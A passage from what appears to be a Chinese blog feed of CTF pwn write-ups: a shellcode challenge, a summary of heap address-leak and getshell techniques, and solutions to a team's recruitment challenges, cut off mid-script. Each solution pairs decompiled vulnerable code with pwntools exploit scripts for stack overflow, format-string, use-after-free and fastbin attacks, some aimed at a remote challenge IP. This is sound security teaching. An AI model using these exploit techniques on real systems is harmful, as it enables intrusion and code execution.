0LL) + 0x500;    --》rw  低地址</span><br><span class="line">  `</span><br><span class="line"></span><br><span class="line">  v3 = (void (__fastcall *)(__int64, char *))dest;</span><br><span class="line">  memset(&amp;s, 0, 8uLL);</span><br><span class="line">  puts(&quot;Show Ne0 your shellcode:&quot;);</span><br><span class="line">  read(0, &amp;s, 6uLL);</span><br><span class="line">  judge_shellcode((__int64)&amp;s);</span><br><span class="line">  v4 = strlen(src);</span><br><span class="line">  memcpy(dest, src, v4);</span><br><span class="line">  v5 = (char *)dest;</span><br><span class="line">  v6 = strlen(src);</span><br><span class="line">  memcpy(&amp;v5[v6], &amp;s, 7uLL);</span><br><span class="line">  v3(qword_202098, &amp;s);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序刚开始mmap了两个地址，之后要求读入6个字节的shellcode，进入judge_shellcode进行判断，需要六个字节各不相同<br>最后会将src代码复制到第一个chunk 并执行其中的代码</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>思路就是六个字节通过系统调用read函数，同时将rsi设置为rsp，即之后输入到栈顶，溢出到第一个chunk(即高地址的chunk)，将shellcode写入即可<br>(大概思路应该是这样，但是题目本身理解的还不是特别清楚，后面还得再看)</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./six&apos;)</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">sc=&apos;&apos;&apos;push rsp;pop rsi;lahf;xchg edx,eax;syscall&apos;&apos;&apos;</span><br><span class="line">sc = asm(sc)</span><br><span class="line">sh.sendafter(&apos;:&apos;,sc)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*(0x1000-0x500)</span><br><span class="line">pay+=&apos;\x90&apos;*0x36+asm(shellcraft.sh())</span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn Heap leak addr &amp;&amp; getshell</title>
      <link href="/2019/02/14/pwn-heap-leak-addr-getshell/"/>
      <url>/2019/02/14/pwn-heap-leak-addr-getshell/</url>
      <content type="html"><![CDATA[<p><em>在堆相关的题中经常需要泄露地址及最后的getshell，总结一下比较常用的方法：</em></p><h1 id="Leak-Address"><a href="#Leak-Address" class="headerlink" title="Leak Address"></a>Leak Address</h1><h2 id="heap-base"><a href="#heap-base" class="headerlink" title="heap base"></a>heap base</h2><ol><li>最常用的即在存在UAF或溢出之类的条件下，因为fastbin 在内存中为单链存放，之后释放的fastbin范围的chunk的fd指针会指向之前释放的等大小范围的chunk，泄露fd指针即可得到heap base</li><li>main arena中存放着top chunk的地址，如果有条件泄露其地址便可以得到heap base</li></ol><h2 id="libc-base"><a href="#libc-base" class="headerlink" title="libc base"></a>libc base</h2><ol><li>unsorted bin为双向链表，而第一个unsorted bin的fd 与 bk指针都指向main_arena+88 处，泄露指针处即可计算得到libc base</li></ol><h2 id="stack-addr"><a href="#stack-addr" class="headerlink" title="stack addr"></a>stack addr</h2><ol><li>一般在可以得到libc base的情况下，可以利用libc中存放的_environ指针，该指针指向栈中环境变量的位置，泄露该指针的值便可以得到栈地址</li></ol><h1 id="Get-Shell"><a href="#Get-Shell" class="headerlink" title="Get Shell"></a>Get Shell</h1><h2 id="write-to-plt-got"><a href="#write-to-plt-got" class="headerlink" title="write to .plt.got"></a>write to .plt.got</h2><p>当程序保护中got表不满时 即 ： RELRO: Partial RELRO 。此时got表可写，可以将某个函数的got地址改写为system()函数的地址，然后想办法将’/bin/sh’传参进去，get shell</p><h2 id="write-to-malloc-hook-or-free-hook"><a href="#write-to-malloc-hook-or-free-hook" class="headerlink" title="write to malloc_hook or free_hook"></a>write to malloc_hook or free_hook</h2><p>malloc_hook &amp;&amp; free_hook 是程序在调用malloc或free时会首先检查的地方，如果不为空，会先执行其指针指向的地方，所以如果将one_gadget或system(‘/bin/sh’)的地址写向该地址，便可以 get shell</p><h2 id="write-to-stack"><a href="#write-to-stack" class="headerlink" title="write to stack"></a>write to stack</h2><p>一般来说，这个真的是没有办法的话才用，利用上面的方法得到栈地址后，利用漏洞将one_gadget或system(‘/bin/sh’)的地址写向返回地址，这样程序在退出时便会getshell</p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>l3h-sec Pwn Recruit New Questions</title>
      <link href="/2019/02/12/l3h-sec-pwn-recruit-new-questions/"/>
      <url>/2019/02/12/l3h-sec-pwn-recruit-new-questions/</url>
      <content type="html"><![CDATA[<p><em>华科一个新战队的招新题，正好最近没有兴致继续下去，来玩一玩招新题</em></p><h1 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h1><p>最简单的栈溢出</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./stack&apos;)</span><br><span class="line">sh =remote(&apos;159.65.68.241&apos;,&apos;10003&apos;)</span><br><span class="line">sys_addr = 0x80491e2</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x3a +&apos;bbbb&apos;+p32(sys_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(pay)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pubg"><a href="#pubg" class="headerlink" title="pubg"></a>pubg</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>先是一大段将随机值写入key.txt然后读出等等，然后将输入的值与读出的值进行比较，相等则进入overflow函数，栈溢出getshell就行。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前面一大段其实是可以不用管的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_401DDC(int time, void *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [rsp+10h] [rbp-50h]</span><br><span class="line">  FILE *stream; // [rsp+50h] [rbp-10h]</span><br><span class="line">  unsigned int i; // [rsp+5Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  stream = fopen(&quot;./key.txt&quot;, &quot;w&quot;);</span><br><span class="line">  for ( i = 0; time + 1 &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(&amp;s, 0, 0x40uLL);</span><br><span class="line">    sub_401B55((__int64)ptr, (__int64)&amp;s, 0x10u);</span><br><span class="line">    memset(ptr, 0, 0x40uLL);</span><br><span class="line">    strcpy((char *)ptr, &amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  fwrite(ptr, 0x20uLL, 1uLL, stream);           // s --&gt; file</span><br><span class="line">  return fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在这一段里可以发现如果输入的time=-1，那么整个写入的循环便会被跳过，随后输入空值便可以进入overflow函数，溢出getshell</p><p>需要注意的是前面需要先写入一次使得key.txt创建，如果文件已经创建的话其实就可以不用了。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">#p=process(&apos;./pubg&apos;)</span><br><span class="line">p=remote(&apos;159.65.68.241&apos;,9001)</span><br><span class="line">p.recvuntil(&apos;code&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.sendline(&apos;-2&apos;)</span><br><span class="line">time.sleep(5)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">#p=process(&apos;./pubg&apos;)</span><br><span class="line">p=remote(&apos;159.65.68.241&apos;,9001)</span><br><span class="line">p.recvuntil(&apos;code&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.sendline(&apos;-1&apos;)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.send(&apos;\x00&apos;*16)</span><br><span class="line">p.recvuntil(&apos;:&apos;)</span><br><span class="line">p.send(&apos;A&apos;*0x28+p64(0x401BED))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">unsigned int Game()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line">  unsigned int v1; // eax</span><br><span class="line">  char s; // [esp+Ch] [ebp-10Ch]</span><br><span class="line">  char v4; // [esp+106h] [ebp-12h]</span><br><span class="line">  char v5; // [esp+107h] [ebp-11h]</span><br><span class="line">  char v6; // [esp+108h] [ebp-10h]</span><br><span class="line">  char v7; // [esp+109h] [ebp-Fh]</span><br><span class="line">  char v8; // [esp+10Ah] [ebp-Eh]</span><br><span class="line">  unsigned int v9; // [esp+10Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v9 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;s, 0, 0x100u);</span><br><span class="line">  v0 = time(0);</span><br><span class="line">  srand(v0);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  v5 = rand();</span><br><span class="line">  v6 = rand();</span><br><span class="line">  v7 = rand();</span><br><span class="line">  v8 = 0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  puts(&quot;What&apos;s your magic string?&quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  v1 = Hash(&amp;s);</span><br><span class="line">  if ( v1 == *(_DWORD *)&amp;v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Congraz!! Your magic string is:&quot;);</span><br><span class="line">    printf(&amp;s);                                 // fmt</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wrong!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>有个明显的栈溢出与fmt漏洞，一共三次机会<br>思路便是输入格式化字符串并使用\x00截断，同时溢出至v4，因为hash中的算法已知且其使用strlen，因此可以利用其将输入的\x00之前的字符串的hash计算出来，并将其写入v4，这样通过检查，利用fmt漏洞分别泄露canary 与libc基址，最后一次覆盖栈返回地址为已给的hacker函数即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal=[&apos;bash&apos;]</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line">#p=process(&apos;./game&apos;)</span><br><span class="line">p=remote(&apos;159.65.68.241&apos;,10002)</span><br><span class="line">p.recvuntil(&apos;?&apos;)</span><br><span class="line">p.sendline(&apos;%71$p&apos;.ljust(250,b&apos;\x00&apos;)+p32(0x365))</span><br><span class="line">p.recvuntil(&apos;:\n&apos;)</span><br><span class="line">canary=p.recvuntil(&apos;W&apos;)[:-1]</span><br><span class="line">print(&apos;canary is &apos;+ canary)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">p.sendline(&apos;%3$p&apos;.ljust(250,&apos;\x00&apos;)+p32(0x19))</span><br><span class="line">p.recvuntil(&apos;:\n&apos;)</span><br><span class="line">base=p.recvuntil(&apos;W&apos;)[:-1]</span><br><span class="line">print(&apos;base is &apos;+ base)</span><br><span class="line">p.sendline(&apos;\x00&apos;*0x100+p32(int(canary,16))+&apos;A&apos;*12+p32(int(base[:-3]+&apos;2f5&apos;,16)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="vitamin"><a href="#vitamin" class="headerlink" title="vitamin"></a>vitamin</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>简单的堆，基本上没有检查</p><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>UAF将堆分配到bss段改buf指针指向got表，修改got表某个函数即可</p><p>(前面傻逼了好久，忘了开始的fork，调试attach不上进程，懵逼了好久)</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">context.log_level=&apos;debug&apos; </span><br><span class="line">p=process(&apos;./vitamin&apos;) </span><br><span class="line">#p=remote(&apos;159.65.68.241&apos;, 10001) </span><br><span class="line"></span><br><span class="line">def debug(addr = &apos;0x400BC7&apos;):     </span><br><span class="line">  gdb.attach(proc.pidof(p)[0]+1, &quot;b *&quot; + addr)     </span><br><span class="line">  raw_input(&apos;debug:&apos;) </span><br><span class="line"></span><br><span class="line">def create(formula):     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(&apos;1&apos;)     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(formula) </span><br><span class="line"> </span><br><span class="line">def change(formula):     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(&apos;3&apos;)     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(formula) </span><br><span class="line"> </span><br><span class="line">def take():     </span><br><span class="line">  p.recvuntil(&apos;:\n&apos;)     </span><br><span class="line">  p.sendline(&apos;2&apos;) #debug() </span><br><span class="line"> </span><br><span class="line">free_got=0x602018 </span><br><span class="line">create(&apos;aaaa&apos;) </span><br><span class="line">take() </span><br><span class="line">change(p64(0x6020dd)) </span><br><span class="line">create(p64(0x6020dd)) </span><br><span class="line">create(&apos;A&apos;*11+p64(free_got)) </span><br><span class="line">change(p64(0x400d58)) </span><br><span class="line">p.sendline(&apos;2&apos;) </span><br><span class="line">take()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="store"><a href="#store" class="headerlink" title="store"></a>store</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>选项题，功能有add,read,sell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">    保护： </span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">int add_book()</span><br><span class="line">&#123;</span><br><span class="line">  size_t size; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  for ( HIDWORD(size) = 0; HIDWORD(size) &lt;= 0xF &amp;&amp; ptr[5 * HIDWORD(size)]; ++HIDWORD(size) )</span><br><span class="line">    ;</span><br><span class="line">  if ( HIDWORD(size) == 16 )</span><br><span class="line">    puts(&quot;Too many books&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  puts(&quot;What is the author name?&quot;);</span><br><span class="line">  readn(0x28LL * HIDWORD(size) + 0x602060, 0x1F);</span><br><span class="line"></span><br><span class="line">  puts(&quot;How long is the book name?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;size);</span><br><span class="line"></span><br><span class="line">  if ( (unsigned int)size &gt; 0x50 )</span><br><span class="line">    return puts(&quot;Too big!&quot;);</span><br><span class="line">  ptr[5 * HIDWORD(size)] = malloc((unsigned int)size);</span><br><span class="line">  puts(&quot;What is the name of the book?&quot;);</span><br><span class="line">  readn(ptr[5 * HIDWORD(size)], size);          // size==0 时，溢出</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 漏洞函数</span><br><span class="line">__int64 __fastcall readn(__int64 a1, int len)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  unsigned int v3; // eax</span><br><span class="line">  unsigned __int8 buf; // [rsp+1Bh] [rbp-5h]</span><br><span class="line">  unsigned int v5; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v5 = 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (unsigned int)(len - 1);</span><br><span class="line">    if ( (unsigned int)result &lt;= v5 )</span><br><span class="line">      break;</span><br><span class="line">    read(0, &amp;buf, 1uLL);</span><br><span class="line">    result = buf;</span><br><span class="line">    if ( buf == &apos;\n&apos; )</span><br><span class="line">      break;</span><br><span class="line">    v3 = v5++;</span><br><span class="line">    *(_BYTE *)(a1 + v3) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int sellbook()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int idx; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Which book do you want to sell?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;idx);</span><br><span class="line">  if ( idx &gt; 0x10 )</span><br><span class="line">    return puts(&quot;Out of bound!&quot;);</span><br><span class="line">  if ( !ptr[5 * idx] )                          // ptr as inuse</span><br><span class="line">    return puts(&quot;No such book!&quot;);</span><br><span class="line">  free((void *)ptr[5 * idx]);</span><br><span class="line">  ptr[5 * idx] = 0LL;                           // ptr=0</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int readbook()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int idx; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Which book do you want to sell?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;idx);</span><br><span class="line">  if ( idx &gt; 0x10 )</span><br><span class="line">    return puts(&quot;Out of bound!&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  if ( ptr[5 * idx] )                           // 检查ptr</span><br><span class="line">    return printf(&quot;Author:%s\nBookname:%s\n&quot;, 0x28LL * idx + 0x602060, ptr[5 * idx]);    -&gt;%s泄漏信息</span><br><span class="line">  return puts(&quot;No such book!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>在输入size为0时readn函数漏洞，此时可以输入无限长度，可以溢出。结合readbook函数可以泄露堆地址；</p><p>fastbin attack将chunk分配到bss段存储指针及author name的地方，修改指针为某一函数got地址计算得到libc基址。</p><p>之后就需要getshell了，想法有：</p><ol><li>写got表，但是full relro，所以不行；</li><li>复写malloc_hook或free_hook,这个尝试了半天，因为在malloc_hook附近分配时需要用0x7f绕过大小检查，但是用户自己申请的大小最大为0x50，最终size最大便是0x60，于是想直接在bss段伪造0x70大小的chunk，并free掉，但是坑爹的是bss段一共就只有0x7f大小。。。最终放弃；</li><li>无奈之下，尝试将chunk分配到栈中覆盖返回地址，终于getshell！！</li></ol><p>从出题的学长那里学到了另一种思路</p><ol><li>利用fastbin attack将一个伪造的size作为fd放入fastbinY中，而该指针会在main_arena 处存放，然后我们可以将其作为fakechunk的size，将chunk分配到main_arena处</li><li>分配过去之后，就可以修改main_arena处存放的top chunk地址，此时将top chunk地址提到malloc hook之上，再次申请一个chunk，如果选择的size在fastbinY中不存在，那么便会从topchunk中切割，也就会分配到malloc hook之上</li><li>修改最后一个chunk的内容即修改malloc hook的值</li></ol><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">#sh= 